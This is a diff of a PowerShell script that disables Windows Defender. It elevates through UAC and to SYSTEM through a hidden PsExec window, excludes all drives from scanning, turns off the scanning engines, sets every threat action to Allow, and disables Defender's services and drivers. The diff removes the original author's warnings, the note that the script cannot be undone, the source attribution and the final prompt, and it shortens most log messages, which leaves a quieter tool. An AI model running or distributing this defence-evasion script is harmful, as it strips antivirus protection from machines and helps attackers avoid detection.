@@ -1,44 +1,11 @@
-# Disable Windows Defender
-
-<#
-                           _               _ 
- __      ____ _ _ __ _ __ (_)_ __   __ _  | |
- \ \ /\ / / _` | '__| '_ \| | '_ \ / _` | | |
-  \ V  V / (_| | |  | | | | | | | | (_| | |_|
-   \_/\_/ \__,_|_|  |_| |_|_|_| |_|\__, | (_)
-                                   |___/     
-
-This script is NOT a disable/enable solution, I'm a malware analyst, I use it for malware analysis.
-It can completely DELETE Defender, and it is NOT REVERSIBLE (that's what I need).
-Once you have run it, you will no longer have any sort of antivirus protection, and WILL NOT BE ABLE to reactivate it.
-
-Think twice before running it, or read the blog post to understand and modify it to suit **your** needs.
-
-THIS IS NOT A JOKE.
-YOU HAVE BEEN WARNED.
-#>
-
-<#
-Options :
-
--Delete : delete the defender related files (services, drivers, executables, ....) 
-
-Source :  https://bidouillesecurity.com/disable-windows-defender-in-powershell
-
-#>
-
-Write-Host "[+] Disable Windows Defender (as $(whoami))"
-
-
-## STEP 0 : elevate if needed
-
+Write-Host "[+] Disable (as $(whoami))"
 
 if(-Not $($(whoami) -eq "nt authority\system")) {
     $IsSystem = $false
 
     # Elevate to admin (needed when called after reboot)
     if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
-        Write-Host "    [i] Elevate to Administrator"
+        Write-Host "    [!] Elevate"
         $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
         Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
         Exit
@@ -47,12 +14,12 @@ if(-Not $($(whoami) -eq "nt authority\system")) {
     # Elevate to SYSTEM if psexec is available
     $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source 
     if($psexec_path) {
-        Write-Host "    [i] Elevate to SYSTEM"
+        Write-Host "    [!] SYS"
         $CommandLine = " -i -s powershell.exe -ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments 
         Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine
         exit
     } else {
-        Write-Host "    [i] PsExec not found, will continue as Administrator"
+        Write-Host "    [!] PsExec missing"
     }
 
 } else {
@@ -63,7 +30,7 @@ if(-Not $($(whoami) -eq "nt authority\system")) {
 ## STEP 1 : Disable everything we can with immediate effect
 
 
-Write-Host "    [+] Add exclusions"
+Write-Host "    [!] Exclusion"
 
 # Add the whole system in Defender exclusions
 
@@ -73,7 +40,7 @@ Write-Host "    [+] Add exclusions"
     Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
 }
 
-Write-Host "    [+] Disable scanning engines (Set-MpPreference)"
+Write-Host "    [!] (Set-MpPreference)"
 
 Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
 Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
@@ -86,7 +53,7 @@ Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
 Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
 Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
 
-Write-Host "    [+] Set default actions to Allow (Set-MpPreference)"
+Write-Host "    [!] Set Allow"
 
 Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
@@ -96,7 +63,7 @@ Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
 ## STEP 2 : Disable services, we cannot stop them, but we can disable them (they won't start next reboot)
 
 
-Write-Host "    [+] Disable services"
+Write-Host "    [!] Disable services"
 
 $need_reboot = $false
 
@@ -119,7 +86,7 @@ foreach($svc in $svc_list) {
     }
 }
 
-Write-Host "    [+] Disable drivers"
+Write-Host "    [!] Disable drivers"
 
 # WdnisDrv : Network Inspection System Driver
 # wdfilter : Mini-Filter Driver
@@ -232,6 +199,3 @@ if($need_reboot) {
         }
     }
 }
-
-Write-Host ""
-Read-Host -Prompt "Press any key to continue"
